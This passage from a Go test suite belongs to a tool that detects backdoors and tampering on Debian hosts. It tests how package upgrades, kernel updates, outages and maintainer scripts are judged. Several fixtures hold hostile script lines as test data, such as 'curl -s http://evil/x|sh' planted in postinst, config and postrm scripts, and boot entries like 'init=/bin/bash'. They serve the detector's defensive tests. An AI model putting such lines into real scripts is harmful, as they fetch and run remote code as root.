		pkgverify.FileVerdict{Path: "/var/lib/dpkg/info/openssl.triggers", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("interest /usr/bin"), Actual: h("interest /usr/bin"), Source: "archive"}))
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.postinst")
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.triggers")
	if g := explained(r, "explained:openssl"); g == nil || !hasEvidencePath(g, "/var/lib/dpkg/info/openssl.postinst") {
		t.Errorf("verified scripts are not shown with the upgrade: %+v", g)
	}
}

// R63: a recorded version change with no changed files that nothing
// confirmed is a note, not an explained upgrade.
func TestJudgeVersionOnlyChange(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
	cur := clone(old)
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))
	r := run(cur, snapOf(old), archive())
	f := must(t, r, "snap.pkg_version_only:openssl", model.SevNote)
	if want := "The recorded version of openssl changed from 3.0.14-1~deb12u2 to 3.0.15-1~deb12u1, but no files changed and the new version could not be confirmed"; f.Title != want {
		t.Errorf("title %q", f.Title)
	}
	if explained(r, "explained:openssl") != nil {
		t.Errorf("unconfirmed version change explained")
	}
	// Confirmed by a verified file, it is an explained upgrade.
	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Source: "archive"}))
	absent(t, r, "snap.pkg_version_only:openssl")
	if explained(r, "explained:openssl") == nil {
		t.Errorf("confirmed upgrade not explained")
	}
}

const info = "/var/lib/dpkg/info/"

func verdict(p, name, version, content string) pkgverify.FileVerdict {
	return pkgverify.FileVerdict{Path: p, Package: name, Version: version, Expected: h(content), Actual: h(content), Source: pkgverify.SourceArchive}
}

func severest(r *model.Report) model.Severity {
	top := model.SevExplained
	for _, f := range r.Findings {
		if f.Severity > top {
			top = f.Severity
		}
	}
	return top
}

// kernelUpdate is a routine kernel update between the snapshot and now:
// the new kernel package, its maintainer script, and everything its
// installation rebuilds.
func kernelUpdate() (old, cur *model.Collection) {
	old = clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/boot/vmlinuz-6.1.0-25-amd64"))
	old.Files = append(old.Files,
		file("/boot/vmlinuz-6.1.0-25-amd64", "k25", 0o644),
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25", 0o644),
		file("/lib/modules/6.1.0-25-amd64/modules.dep", "dep 25", 0o644),
		file("/boot/grub/grub.cfg", "menu 25", 0o444))
	cur = clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("linux-image-6.1.0-27-amd64", "6.1.115-1",
		"/boot/vmlinuz-6.1.0-27-amd64", "/lib/modules/6.1.0-27-amd64/kernel/fs/ext4/ext4.ko"))
	cur.Files = append(cur.Files,
		file("/boot/vmlinuz-6.1.0-27-amd64", "k27", 0o644),
		file("/lib/modules/6.1.0-27-amd64/kernel/fs/ext4/ext4.ko", "ext4", 0o644),
		file(info+"linux-image-6.1.0-27-amd64.postinst", "#!/bin/sh\nlinux-update-symlinks install 6.1.0-27-amd64", 0o755),
		file(info+"linux-image-6.1.0-27-amd64.list", "list", 0o644),
		file("/boot/initrd.img-6.1.0-27-amd64", "initrd 27", 0o644),
		file("/lib/modules/6.1.0-27-amd64/modules.dep", "dep 27", 0o644),
		file("/lib/modules/6.1.0-27-amd64/modules.alias", "alias 27", 0o644),
		file("/lib/modules/6.1.0-27-amd64/modules.symbols", "sym 27", 0o644))
	setFile(cur, file("/boot/grub/grub.cfg", "menu 27", 0o444))
	return old, cur
}

var kernelPaths = []string{"/boot/vmlinuz-6.1.0-27-amd64", "/lib/modules/6.1.0-27-amd64/kernel/fs/ext4/ext4.ko", info + "linux-image-6.1.0-27-amd64.postinst"}

var rebuiltPaths = []string{"/boot/initrd.img-6.1.0-27-amd64", "/lib/modules/6.1.0-27-amd64/modules.dep", "/lib/modules/6.1.0-27-amd64/modules.alias",
	"/lib/modules/6.1.0-27-amd64/modules.symbols", "/boot/grub/grub.cfg"}

func kernelUnverifiable(kind, reason string) *pkgverify.Result {
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive}
	for _, p := range kernelPaths {
		res.Unverifiable = append(res.Unverifiable, pkgverify.FileVerdict{Path: p, Package: "linux-image-6.1.0-27-amd64", Version: "6.1.115-1", Reason: reason, Kind: kind})
	}
	return res
}

// R66: a real outage (the host's own indexes could not be read) during a
// routine kernel update is one note. Nothing could confirm the new kernel
// package, so the files its installation rebuilt and its maintainer script
// join the files that could not be checked instead of becoming a backdoor
// sign each.
func TestJudgeOutageDuringKernelUpdateIsOneNote(t *testing.T) {
	old, cur := kernelUpdate()
	res := kernelUnverifiable(pkgverify.KindUnreachable, "could not read the official archive index: dial tcp: i/o timeout")
	res.Errors = []string{"https://deb.debian.org/debian/dists/bookworm/InRelease: dial tcp: i/o timeout"}
	r := run(cur, snapOf(old), res)
	if top := severest(r); top > model.SevNote || r.ExitCode != 1 {
		t.Fatalf("an outage during a kernel update: severest %v, exit %d, findings %v", top, r.ExitCode, keys(r))
	}
	f := must(t, r, "pkg.unchecked_changes", model.SevNote)
	for _, p := range append(append([]string(nil), kernelPaths...), rebuiltPaths...) {
		if !hasEvidencePath(f, p) {
			t.Errorf("the unchecked note lacks %s", p)
		}
		absent(t, r, "snap.file_added:"+p)
		absent(t, r, "snap.file_modified:"+p)
	}
	if !strings.Contains(f.Title, "could not be checked because the package archive could not be reached") {
		t.Errorf("title %q", f.Title)
	}
	if g := explained(r, "explained:linux-image-6.1.0-27-amd64"); g != nil {
		t.Errorf("a kernel package nothing checked is explained: %+v", g)
	}
}

// With the archive reachable, a kernel version no trusted source has
// explains nothing: the rebuilt files stay backdoor signs, and they do not
// claim that no package changed.
func TestJudgeUnconfirmedRebuilderWording(t *testing.T) {
	old, cur := kernelUpdate()
	res := kernelUnverifiable(pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
	res.SourcesUsed = []string{"https://deb.debian.org/debian bookworm"}
	r := run(cur, snapOf(old), res)
	absent(t, r, "pkg.unchecked_changes")
	f := must(t, r, "snap.file_added:/boot/initrd.img-6.1.0-27-amd64", model.SevBackdoor)
	if strings.Contains(f.Why, "none of them changed") || !strings.Contains(f.Why, "linux-image-6.1.0-27-amd64") || !strings.Contains(f.Why, "no trusted source confirmed") {
		t.Errorf("why %q: it must name the changed package that nothing confirmed", f.Why)
	}
	must(t, r, "snap.file_added:"+info+"linux-image-6.1.0-27-amd64.postinst", model.SevBackdoor)

	// No package that rebuilds an initramfs changed at all: the old wording.
	old2 := clean()
	old2.Files = append(old2.Files, file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644))
	cur2 := clone(old2)
	setFile(cur2, file("/boot/initrd.img-6.1.0-25-amd64", "initrd with implant", 0o644))
	f = must(t, run(cur2, snapOf(old2), archive()), "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
	if !strings.Contains(f.Why, "none of them changed since the snapshot") {
		t.Errorf("why %q", f.Why)
	}
}

// R65: a routine install of a library with nothing in the default check
// scope. Package verification compared its maintainer scripts with the
// signed package, which confirms the install: no backdoor signs.
func TestJudgeVerifiedMaintainerScriptsConfirmAnInstall(t *testing.T) {
	const postinst, prerm = "#!/bin/sh\npy3compile -p python3-requests", "#!/bin/sh\npy3clean -p python3-requests"
	old := clean()
	cur := clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("python3-requests", "2.28.1+dfsg-1", "/usr/lib/python3/dist-packages/requests/__init__.py"))
	cur.Files = append(cur.Files,
		file("/usr/lib/python3/dist-packages/requests/__init__.py", "py", 0o644),
		file(info+"python3-requests.list", "list", 0o644),
		file(info+"python3-requests.md5sums", "sums", 0o644),
		file(info+"python3-requests.postinst", postinst, 0o755),
		file(info+"python3-requests.prerm", prerm, 0o755))
	const v = "2.28.1+dfsg-1"
	r := run(cur, snapOf(old), archive(
		verdict("/usr/lib/python3/dist-packages/requests/__init__.py", "python3-requests", v, "py"),
		verdict(info+"python3-requests.postinst", "python3-requests", v, postinst),
		verdict(info+"python3-requests.prerm", "python3-requests", v, prerm)))
	if top := severest(r); top > model.SevNote || r.ExitCode != 1 {
		t.Fatalf("a routine library install: severest %v, exit %d, findings %v", top, r.ExitCode, keys(r))
	}
	f := must(t, r, "snap.pkg_installed:python3-requests", model.SevNote)
	for _, s := range []string{"postinst", "prerm"} {
		absent(t, r, "snap.file_added:"+info+"python3-requests."+s)
		if !hasEvidencePath(f, info+"python3-requests."+s) {
			t.Errorf("the install lacks its %s", s)
		}
	}

	// A script that differs from the signed package is tampering, and one
	// package verification could not place is still a backdoor sign.
	res := archive(verdict("/usr/lib/python3/dist-packages/requests/__init__.py", "python3-requests", v, "py"))
	res.Mismatch = []pkgverify.FileVerdict{{Path: info + "python3-requests.postinst", Package: "python3-requests", Version: v, Expected: h(postinst), Actual: h("evil"),
		Reason: "differs from the maintainer script in the signed package", Kind: pkgverify.KindContentDiffers, Source: pkgverify.SourceArchive}}
	setFile(cur, file(info+"python3-requests.postinst", "evil", 0o755))
	r = run(cur, snapOf(old), res)
	f = must(t, r, "pkg.mismatch:"+info+"python3-requests.postinst", model.SevTampering)
	// A reinstall runs the package's old scripts: the fix must move the
	// tampered one away first.
	if rm, re := strings.Index(f.Fix, "rm -- "), strings.Index(f.Fix, "apt-get install --reinstall"); rm < 0 || re < rm || !strings.Contains(f.Why, "runs") {
		t.Errorf("fix %q, why %q", f.Fix, f.Why)
	}
	must(t, r, "snap.file_added:"+info+"python3-requests.prerm", model.SevBackdoor)

	// The machine's own checksums do not cover maintainer scripts: in
	// offline mode they belong to a package change those checksums confirm.
	setFile(cur, file(info+"python3-requests.postinst", postinst, 0o755))
	off := &pkgverify.Result{Mode: pkgverify.ModeOfflineLocal, Errors: []string{pkgverify.OfflineWarning}, Verified: []pkgverify.FileVerdict{
		{Path: "/usr/lib/python3/dist-packages/requests/__init__.py", Package: "python3-requests", Version: v, Expected: "md5:aa", Actual: "md5:aa", Source: pkgverify.SourceOfflineLocal}}}
	r = run(cur, snapOf(old), off)
	absent(t, r, "snap.file_added:"+info+"python3-requests.postinst")
	absent(t, r, "snap.file_added:"+info+"python3-requests.prerm")
}

// A package removed but not purged keeps its postrm, which runs on purge.
// An edited one is a backdoor sign, not part of the removal; one that
// matches the signed package of the removed version is.
func TestJudgePostrmOfRemovedPackage(t *testing.T) {
	const postrm = info + "jq.postrm"
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("jq", "1.6-2.1", "/usr/bin/jq"))
	old.Files = append(old.Files, file("/usr/bin/jq", "jq 1", 0o755), file(postrm, "#!/bin/sh\nexit 0", 0o755))
	cur := clone(old)
	removePkg(cur, "jq")
	cur.Packages.Residual = []model.Package{{Name: "jq", Version: "1.6-2.1", Arch: "amd64", Status: "deinstall ok config-files"}}
	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return e.Path == "/usr/bin/jq" })
	setFile(cur, file(postrm, "#!/bin/sh\ncurl x|sh", 0o755))

	// Nothing verified it (a scan that could not place it).
	r := run(cur, snapOf(old), archive())
	f := must(t, r, "snap.file_modified:"+postrm, model.SevBackdoor)
	if !strings.Contains(f.Why, "runs as root") {
		t.Errorf("why %q", f.Why)
	}
	if hasEvidencePath(must(t, r, "snap.pkg_removed:jq", model.SevNote), postrm) {
		t.Errorf("the edited postrm is folded into the removal")
	}

	// It differs from the signed package's postrm: tampering.
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: postrm, Package: "jq", Version: "1.6-2.1", Expected: h("#!/bin/sh\nexit 0"), Actual: h("#!/bin/sh\ncurl x|sh"),
		Reason: "differs from the maintainer script in the signed package", Kind: pkgverify.KindContentDiffers, Source: pkgverify.SourceArchive}}
	must(t, run(cur, snapOf(old), res), "pkg.mismatch:"+postrm, model.SevTampering)

	// The postrm of the version that was removed (upgraded, then removed,
	// since the snapshot): verified, so it is part of the removal.
	cur.Packages.Residual[0].Version = "1.6-2.2"
	setFile(cur, file(postrm, "#!/bin/sh\nexit 0 # 2.2", 0o755))
	r = run(cur, snapOf(old), archive(verdict(postrm, "jq", "1.6-2.2", "#!/bin/sh\nexit 0 # 2.2")))
	absent(t, r, "snap.file_modified:"+postrm)
	if !hasEvidencePath(must(t, r, "snap.pkg_removed:jq", model.SevNote), postrm) {
		t.Errorf("the verified postrm is not shown with the removal")
	}
	// A verdict for another version than the one dpkg records confirms nothing.
	r = run(cur, snapOf(old), archive(verdict(postrm, "jq", "1.6-2.1", "#!/bin/sh\nexit 0 # 2.2")))
	must(t, r, "snap.file_modified:"+postrm, model.SevBackdoor)
}

// A line with an empty name is used by glibc (lookups by id match it), a
// line it cannot parse is skipped: the finding says which.
func TestJudgeMalformedAccountLineWording(t *testing.T) {
	c := clean()
	c.Accounts.Malformed = []string{"/etc/passwd:1 (empty name, uid 0)", "/etc/passwd:7", "/etc/group:3 (empty name, gid 27, members eve)", "/etc/shadow:2 (empty name)"}
	r := run(c, nil, archive())
	for _, k := range []string{"/etc/passwd:1 (empty name, uid 0)", "/etc/group:3 (empty name, gid 27, members eve)", "/etc/shadow:2 (empty name)"} {
		f := must(t, r, "acct.malformed:"+k, model.SevBackdoor)
		if strings.Contains(f.Why, "glibc skips") || strings.Contains(f.Evidence[0].Detail, "rejected") || !strings.Contains(f.Why, "glibc uses this line") {
			t.Errorf("%s: why %q, detail %q: glibc uses an empty-name line", k, f.Why, f.Evidence[0].Detail)
		}
	}
	if f := must(t, r, "acct.malformed:/etc/passwd:1 (empty name, uid 0)", model.SevBackdoor); !strings.Contains(f.Why, "user id") {
		t.Errorf("passwd why %q", f.Why)
	}
	f := must(t, r, "acct.malformed:/etc/passwd:7", model.SevBackdoor)
	if !strings.Contains(f.Why, "glibc skips this line") || f.Evidence[0].Detail != "rejected by glibc's parser" {
		t.Errorf("rejected line: why %q, detail %q", f.Why, f.Evidence[0].Detail)
	}
}

// With a release telltale does not verify, nothing was looked up: the
// package change must not say that no trusted source confirmed it.
func TestJudgeUnsupportedReleaseUpgradeWording(t *testing.T) {
	old := clean()
	old.Host.OSVersionID = "11"
	old.Packages.Installed = append(old.Packages.Installed, pkg("jq", "1.6-2.1", "/usr/bin/jq"))
	old.Files = append(old.Files, file("/usr/bin/jq", "jq 1", 0o755))
	cur := clone(old)
	setVersion(cur, "jq", "1.6-2.1+deb11u1")
	setFile(cur, file("/usr/bin/jq", "jq 2", 0o755))
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/bin/jq", Package: "jq", Version: "1.6-2.1+deb11u1", Reason: `release not supported for package verification: "debian" "11"`, Kind: pkgverify.KindRelease}}}
	f := must(t, run(cur, snapOf(old), res), "snap.pkg_upgraded:jq", model.SevBackdoor)
	for _, s := range []string{f.Title, f.Why} {
		if strings.Contains(s, "no trusted source") || strings.Contains(s, "Verification ran") || !strings.Contains(s, "package verification did not run") {
			t.Errorf("%q: verification never ran, and it must say so", s)
		}
	}
	for _, e := range f.Evidence {
		if strings.Contains(e.Detail, "no trusted source") {
			t.Errorf("evidence %q", e.Detail)
		}
	}
}

// R60: a version nothing confirmed explains none of its changed files,
// symbolic links and directories included: a version typed into dpkg
// status must not make a retargeted link part of an "upgrade".
func TestJudgeUnconfirmedVersionExplainsNoLinkOrDirectory(t *testing.T) {
	link := func(target string) model.FileEntry {
		return model.FileEntry{Path: "/usr/bin/awk", Type: "symlink", Target: target, Mode: 0o120777, MTime: taken, CTime: taken}
	}
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("mawk", "1.3.4.20200120-3.1", "/usr/bin/mawk", "/usr/bin/awk", "/usr/share/mawk"))
	old.Files = append(old.Files, file("/usr/bin/mawk", "mawk", 0o755), link("mawk"))
	cur := clone(old)
	setVersion(cur, "mawk", "1.3.4.20200120-3.2")
	setFile(cur, link("./mawk")) // re-pointed, still at the package's own program
	cur.Files = append(cur.Files, model.FileEntry{Path: "/usr/share/mawk", Type: "dir", Mode: 0o040755, MTime: changed, CTime: changed})

	r := run(cur, snapOf(old), archive())
	if len(r.Explained) != 0 || r.ExitCode == 0 {
		t.Fatalf("explained %+v, exit %d: nothing confirmed this version", r.Explained, r.ExitCode)
	}
	f := must(t, r, "snap.pkg_upgraded:mawk", model.SevNote)
	if !hasEvidencePath(f, "/usr/bin/awk") || !hasEvidencePath(f, "/usr/share/mawk") {
		t.Errorf("the unconfirmed upgrade does not list its link and directory: %+v", f.Evidence)
	}

	// The real upgrade, its program verified: they are part of it.
	setFile(cur, file("/usr/bin/mawk", "mawk 2", 0o755))
	r = run(cur, snapOf(old), archive(verdict("/usr/bin/mawk", "mawk", "1.3.4.20200120-3.2", "mawk 2")))
	g := explained(r, "explained:mawk")
	if g == nil || !hasEvidencePath(g, "/usr/bin/awk") || !hasEvidencePath(g, "/usr/share/mawk") || r.ExitCode != 0 {
		t.Errorf("confirmed upgrade: explained %+v, exit %d, findings %v", g, r.ExitCode, keys(r))
	}
}

// R64: the machine's clock decides nothing in package verification; when it
// disagrees with the archive's signed date the report says so.
func TestJudgeClockSkewIsANote(t *testing.T) {
	res := archive()
	res.ClockSkew = &pkgverify.ClockSkew{Clock: now.Add(8 * 24 * time.Hour), Signed: now}
	f := must(t, run(clean(), nil, res), "pkg.clock_skew", model.SevNote)
	if !strings.Contains(f.Title, "is out of date") || !strings.Contains(f.Title, "8 days ahead") || !strings.Contains(f.Why, "2026-11-22") || !strings.Contains(f.Why, "2026-11-30") {
		t.Errorf("title %q, why %q", f.Title, f.Why)
	}
	res.ClockSkew = &pkgverify.ClockSkew{Clock: now.Add(-50 * time.Hour), Signed: now}
	if f := must(t, run(clean(), nil, res), "pkg.clock_skew", model.SevNote); !strings.Contains(f.Title, "2 days behind") || strings.Contains(f.Title+f.Why, "mirror") {
		t.Errorf("title %q", f.Title)
	}
	absent(t, run(clean(), nil, archive()), "pkg.clock_skew")
}

// During an outage pkgverify marks every planned script "unreachable". A
// script edited or planted for a package that did not change is not part of
// any update: it stays a backdoor sign, or anyone who can cut the network
// could append to a postinst for the price of a note.
func TestJudgeOutageDoesNotFoldScriptsOfUnchangedPackages(t *testing.T) {
	const reason = "could not read the official archive index: http://deb.debian.org/debian/dists/bookworm/InRelease: dial tcp: i/o timeout"
	outage := func(p string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{reason},
			Unverifiable: []pkgverify.FileVerdict{{Path: p, Package: "openssl", Version: "3.0.14-1~deb12u2", Reason: reason, Kind: pkgverify.KindUnreachable}}}
	}
	old := clean()
	old.Files = append(old.Files, file(info+"openssl.postinst", "#!/bin/sh\nexit 0\n", 0o755))
	cur := clone(old)
	setFile(cur, file(info+"openssl.postinst", "#!/bin/sh\ncurl -s http://evil/x|sh\nexit 0\n", 0o755))
	r := run(cur, snapOf(old), outage(info+"openssl.postinst"))
	must(t, r, "snap.file_modified:"+info+"openssl.postinst", model.SevBackdoor)
	if f := find(r, "pkg.unchecked_changes"); (f != nil && hasEvidencePath(f, info+"openssl.postinst")) || r.ExitCode != 2 {
		t.Errorf("exit %d, unchecked note %+v", r.ExitCode, f)
	}

	cur = clone(old)
	cur.Files = append(cur.Files, file(info+"openssl.config", "#!/bin/sh\ncurl -s http://evil/x|sh\n", 0o755))
	must(t, run(cur, snapOf(old), outage(info+"openssl.config")), "snap.file_added:"+info+"openssl.config", model.SevBackdoor)

	// The postrm of a package removed in the outage: a removal changes no script.
	cur = clone(old)
	removePkg(cur, "openssl")
	cur.Files = append(cur.Files, file(info+"openssl.postrm", "#!/bin/sh\ncurl x|sh\n", 0o755))
	must(t, run(cur, snapOf(old), outage(info+"openssl.postrm")), "snap.file_added:"+info+"openssl.postrm", model.SevBackdoor)
}

// Removing a kernel deletes its initramfs; it does not rewrite one that is
// still there. A package that dpkg's records say is gone explains no boot
// file that is present and changed.
func TestJudgeRemovalExplainsNoPresentBootFile(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/boot/vmlinuz-6.1.0-25-amd64"))
	old.Files = append(old.Files, file("/boot/vmlinuz-6.1.0-25-amd64", "k25", 0o644), file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25", 0o644),
		file("/boot/grub/grub.cfg", "menu", 0o444))
	cur := clone(old)
	removePkg(cur, "linux-image-6.1.0-25-amd64")
	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25 + backdoor", 0o644))
	setFile(cur, file("/boot/grub/grub.cfg", "menu init=/evil", 0o444))
	r := run(cur, snapOf(old), archive())
	f := must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
	if strings.Contains(f.Why, "no trusted source confirmed") || !strings.Contains(f.Why, "removed") {
		t.Errorf("why %q", f.Why)
	}
	// The boot menu is what removing a kernel rewrites: a note for the owner
	// to accept, never explained by the removal. What the machine boots with
	// is compared on its own (snap.cmdline).
	g := must(t, r, "snap.file_modified:/boot/grub/grub.cfg", model.SevNote)
	if !strings.Contains(g.Why, "removed") {
		t.Errorf("why %q", g.Why)
	}
	if ex := explained(r, "explained:linux-image-6.1.0-25-amd64"); ex != nil && hasEvidencePath(ex, "/boot/grub/grub.cfg") {
		t.Errorf("the boot menu is folded into the removal: %+v", ex)
	}

	// The real removal: the kernel's boot files are gone with it.
	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return strings.Contains(e.Path, "6.1.0-25") })
	setFile(cur, file("/boot/grub/grub.cfg", "menu", 0o444))
	r = run(cur, snapOf(old), archive())
	absent(t, r, "snap.file_removed:/boot/initrd.img-6.1.0-25-amd64")
	if r.ExitCode == 2 {
		t.Errorf("a real kernel removal: %v", keys(r))
	}
}

// A removed (rc) kernel package is never the rebuilder "that could not be
// checked" for a present, changed initrd and grub.cfg during an outage: the
// initramfs stays a backdoor sign, and the boot menu is the note of its own
// that any kernel removal makes it, never one of the files the outage left
// unchecked.
func TestJudgeRemovedPackageDoesNotExcuseBootFilesDuringOutage(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"))
	old.Files = append(old.Files, file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644), file("/boot/grub/grub.cfg", "menu", 0o444))
	cur := clone(old)
	removePkg(cur, "linux-image-6.1.0-25-amd64")
	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "evil initrd", 0o644))
	setFile(cur, file("/boot/grub/grub.cfg", "menu init=/bin/bash", 0o444))
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{"https://deb.debian.org/debian/dists/bookworm/InRelease: dial tcp: i/o timeout"},
		Unverifiable: []pkgverify.FileVerdict{{Path: "/boot/vmlinuz-6.1.0-25-amd64", Package: "linux-image-6.1.0-25-amd64", Version: "6.1.106-3", Reason: "could not read the official archive index: dial tcp: i/o timeout", Kind: pkgverify.KindUnreachable}}}
	r := run(cur, snapOf(old), res)
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
	must(t, r, "snap.file_modified:/boot/grub/grub.cfg", model.SevNote)
	for _, f := range append(slices.Clone(r.Findings), r.Explained...) {
		if !strings.HasPrefix(f.Key, "snap.file_modified:") && hasEvidencePath(&f, "/boot/grub/grub.cfg") {
			t.Errorf("the boot menu is set aside with %s", f.Key)
		}
	}
}

// R71b: accept records the first evidence's After (or the title). For grouped
// process and listener findings it must not hold pids or ports, so that an
// exception sticks across scans, and it must not carry over to the same
// program in a more serious situation.
func TestAcceptedProcessAndListenerNotesStickAcrossScans(t *testing.T) {
	mk := func(pid, port int) *model.Collection {
		c := clean()
		c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "alice", UID: 1000, GID: 1000, Home: "/home/alice", Shell: "/bin/bash", Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d-alice", LastChange: 20000}})
		c.Runtime.Processes = []model.Process{
			{PID: pid, UID: 1000, Exe: "/home/alice/.cache/x/bin", Comm: "x"},
			{PID: pid + 1, UID: 1000, Exe: "/opt/app/app", Comm: "app"},
		}
		c.Runtime.Sockets = []model.Socket{{Proto: "tcp", Local: "0.0.0.0:" + strconv.Itoa(port), State: "LISTEN", Listening: true, PID: pid + 1}}
		return c
	}
	const noteKey, lisKey = "heur.proc_exe:hidden_home:/home/alice/.cache/x/bin", "heur.unowned_listener:/opt/app/app"
	first := mk(1111, 40001)
	s := snapOf(first)
	r := run(first, s, nil)
	for _, k := range []string{noteKey, lisKey} {
		f := must(t, r, k, model.SevNote)
		s.Exceptions = append(s.Exceptions, model.Exception{FindingKey: k, AcceptedValue: currentValue(f), At: taken})
	}
	second := mk(2222, 40002)
	r = run(second, s, nil)
	absent(t, r, noteKey)
	absent(t, r, lisKey)
	if len(r.Exceptions) < 2 {
		t.Errorf("exceptions not applied: %+v", r.Exceptions)
	}
	// The same program as another user (a hidden path outside the owner's
	// home) is a backdoor sign under another key and is not covered.
	third := mk(3333, 40003)
	third.Runtime.Processes = append(third.Runtime.Processes, model.Process{PID: 3400, UID: 0, Exe: "/home/alice/.cache/x/bin", Comm: "x"})
	r = run(third, s, nil)
	must(t, r, "heur.proc_exe:hidden:/home/alice/.cache/x/bin", model.SevBackdoor)
	absent(t, r, noteKey)
}

func pkgLinkCollection(withMD5 bool) *model.Collection {
	c := clean()
	p := pkg("gchrome", "1.0", "/opt/g/c")
	if withMD5 {
		p.LocalMD5 = map[string]string{"/opt/g/c": "0123456789abcdef0123456789abcdef"}
	}
	c.Packages.Installed = append(c.Packages.Installed, p)
	c.Files = append(c.Files, model.FileEntry{Path: "/opt/g/c", Type: "file", Mode: 0o100755, SHA256: h("c"), MD5: "0123456789abcdef0123456789abcdef", Supplementary: true})
	c.Persist = append(c.Persist, model.PersistFile{Path: "/etc/cron.daily/g", Kind: model.PersistKindSystemdEnabled, Mode: 0o120777, Lines: []string{"/opt/g/c"}})
	return c
}

func TestPackageLinkRankedByVerdictAndLocalChecksum(t *testing.T) {
	const key, bkey = "heur.persist_link_pkg:/etc/cron.daily/g", "heur.persist_link:/etc/cron.daily/g"
	v := pkgverify.FileVerdict{Path: "/opt/g/c", Package: "gchrome", Version: "1.0"}
	unver := func() *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{{Path: v.Path, Package: v.Package, Version: v.Version, Reason: "no key", Kind: pkgverify.KindUntrusted}}}
	}
	// Verified by a trusted source: a note.
	f := must(t, run(pkgLinkCollection(true), nil, archive(v)), key, model.SevNote)
	if strings.Contains(f.Why, "root can edit") {
		t.Errorf("trusted verification worded as local-only: %s", f.Why)
	}
	// Unverifiable, but the machine's own md5 matches: a note, worded as weak.
	f = must(t, run(pkgLinkCollection(true), nil, unver()), key, model.SevNote)
	if !strings.Contains(f.Why, "checked only against the machine's own checksums, which root can edit") {
		t.Errorf("why: %s", f.Why)
	}
	// Unverifiable and the md5 differs from the file: a backdoor sign.
	c := pkgLinkCollection(true)
	c.Files[len(c.Files)-1].MD5 = "ffffffffffffffffffffffffffffffff"
	must(t, run(c, nil, unver()), bkey, model.SevBackdoor)
	// Unverifiable and the machine holds no md5 for it: a backdoor sign.
	must(t, run(pkgLinkCollection(false), nil, unver()), bkey, model.SevBackdoor)
	// No verification at all behaves the same.
	must(t, run(pkgLinkCollection(false), nil, nil), bkey, model.SevBackdoor)
	// A mismatch is tampering through its own finding, and the link is not a note.
	mm := &pkgverify.Result{Mode: pkgverify.ModeArchive, Mismatch: []pkgverify.FileVerdict{{Path: "/opt/g/c", Package: "gchrome", Version: "1.0", Expected: "sha256:aa", Actual: "sha256:bb", Reason: "differs", Kind: pkgverify.KindContentDiffers}}}
	r := run(pkgLinkCollection(true), nil, mm)
	must(t, r, bkey, model.SevBackdoor)
	absent(t, r, key)
	must(t, r, "pkg.mismatch:/opt/g/c", model.SevTampering)
}

// An exception accepted for the package-link note must not cover the same
// link once its target is overwritten: the escalation has its own key.
func TestAcceptedPackageLinkNoteDoesNotHideOverwrite(t *testing.T) {
	const key = "heur.persist_link_pkg:/etc/cron.daily/g"
	unver := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{{Path: "/opt/g/c", Package: "gchrome", Version: "1.0", Reason: "no key", Kind: pkgverify.KindUntrusted}}}
	s := snapOf(clean())
	f := must(t, run(pkgLinkCollection(true), s, unver), key, model.SevNote)
	s.Exceptions = append(s.Exceptions, model.Exception{FindingKey: key, AcceptedValue: currentValue(f), At: taken})
	absent(t, run(pkgLinkCollection(true), s, unver), key) // accepted while unchanged
	after := pkgLinkCollection(true)
	after.Files[len(after.Files)-1].MD5 = "ffffffffffffffffffffffffffffffff"
	after.Files[len(after.Files)-1].SHA256 = h("evil")
	r := run(after, s, unver)
	must(t, r, "heur.persist_link:/etc/cron.daily/g", model.SevBackdoor)
	absent(t, r, key)
}

func TestJudgeSaysContainerModulesBelongToTheHost(t *testing.T) {
	c := &model.Collection{AsRoot: true}
	if r := Judge(Input{Collection: c}); slices.Contains(r.CouldNotRuleOut, sharedKernelLimit) {
		t.Fatalf("a machine with its own kernel is called a container: %q", r.CouldNotRuleOut)
	}
	c.Runtime.SharedKernel = true
	if r := Judge(Input{Collection: c}); !slices.Contains(r.CouldNotRuleOut, sharedKernelLimit) {
